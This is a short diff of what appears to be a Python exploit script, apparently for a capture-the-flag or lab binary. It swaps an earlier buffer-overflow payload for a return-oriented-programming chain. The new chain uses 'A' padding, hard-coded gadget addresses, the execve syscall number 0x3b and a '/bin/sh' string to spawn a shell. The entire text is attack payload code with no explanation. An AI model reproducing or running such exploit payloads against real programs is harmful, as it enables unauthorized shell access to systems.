@@ -25,14 +25,31 @@ b main
 
 
 DATA = ''
-DATA += ('AAAAAAAA')
-DATA += ('/bin/sh ')
-DATA += p64(0x00400621)
-DATA += p64(0x00400621)
-DATA += p64(0x00400621)
-DATA += p64(0x00400621)
-DATA += p64(0x00400621)
+# DATA += 'A' * 2048
+# DATA += p64(0x00400621)
+# DATA += p64(0x00400621)
+# DATA += p64(0x00400621)
 
+#uncomment these
+DATA += ('AAAAAAAA')
+DATA += ('AAAAAAAA')
+DATA += ('AAAAAAAA')
+
+DATA += p64(0x00400646) #first called after padding.
+DATA += p64(0x3b)
+DATA += p64(0x0040063e)
+DATA += p64(0x00)
+DATA += p64(0x00400636)
+DATA += p64(0x00)
+DATA += p64(0x0040062e)
+DATA += ('/bin/sh ')
+DATA += p64(0x00400625)
+
+
+# DATA += ('0000003b')
+# DATA += p64(0x00400621)
+# DATA += p64(0x00)
+# DATA += p64(0x0040062e)
 
 
 
